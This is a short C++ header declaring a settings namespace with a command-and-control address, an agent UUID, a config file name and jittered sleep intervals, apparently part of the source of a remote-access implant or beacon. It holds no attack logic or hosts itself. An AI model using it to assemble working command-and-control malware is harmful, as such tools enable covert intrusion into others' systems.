#pragma once
#ifndef __SETTINGS_H__
#define __SETTINGS_H__


#include <string>

namespace Settings {
        extern std::string C2_ADDRESS;
        extern std::string UUID;
        extern std::string CONFIG_FILE_NAME;
        static int MIN_SLEEP_MS = 5000;
        static int MAX_SLEEP_MS = 15000;
}

#endif